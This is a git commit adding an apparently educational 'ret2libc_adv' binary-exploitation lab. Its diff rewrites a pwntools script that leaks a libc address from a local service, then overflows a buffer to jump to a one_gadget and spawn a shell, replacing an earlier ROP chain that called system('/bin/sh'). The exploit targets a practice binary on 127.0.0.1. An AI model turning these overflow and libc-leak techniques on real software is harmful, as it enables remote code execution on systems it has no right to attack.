3fccd3a11d2993557e2976a26032d57d2b227d73
YJK0805 <jerryko103@gmail.com>
2024-09-22 06:35:11 +0800

    add ret2libc_adv lab

--- lab/exp/ret2libc_adv.py
+++ lab/exp/ret2libc_adv.py
@@ -1,18 +1,15 @@
 from pwn import *
 
-# r = process('../ret2libc/share/ret2libc')
-r = remote('127.0.0.1', 10005)
-
+# r = process('../ret2libc_adv/share/ret2libc_adv')
+r = remote('127.0.0.1', 10006)
 r.sendlineafter('>> ', '2')
 r.sendlineafter('Index: ', '11')
 number = int(r.recvline().strip().split(b': ')[1])
 libc_base = number - 0x29d90
 log.info(f'Libc: {hex(libc_base)}')
-pop_rdi = libc_base + 0x2a3e5
-system = libc_base + 0x50d70
-bin_sh = libc_base + 0x1d8678
-ret = pop_rdi + 1
-payload = b'A' * (0x70 + 0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
+new_rbp = libc_base + 0x21bfa8
+one_gadget = libc_base + 0xebd43
+payload = b'A' * 0x70 + p64(new_rbp) + p64(one_gadget)
 r.sendlineafter('>> ', '3')
 r.sendlineafter('Leave a message: ', payload)
 
---
+++ lab/ret2libc_adv/share/run.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+exec 2>/dev/null
+timeout 60 /home/ret2libc_adv/ret2libc_adv
